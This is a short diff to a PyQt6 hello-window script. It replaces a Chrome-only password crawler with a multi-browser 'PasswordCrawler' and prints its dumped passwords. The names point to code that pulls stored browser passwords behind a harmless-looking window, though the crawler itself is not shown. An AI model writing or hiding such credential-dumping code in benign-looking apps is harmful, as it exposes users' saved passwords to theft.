@@ -1,6 +1,6 @@
 import sys
 from PyQt6.QtWidgets import QApplication, QLabel, QWidget
-from PasswordCrawler import ChromePasswordCrawler
+from PasswordCrawler import PasswordCrawler
 
 app = QApplication([])
 
@@ -12,7 +12,8 @@ helloMsg.move(60, 15)
 
 window.show()
 
-chrome = ChromePasswordCrawler()
-crackedPwdArr = chrome.decryptPasswords()
+browsers = PasswordCrawler()
+print(browsers.dump_passwords)
+
 
 sys.exit(app.exec())
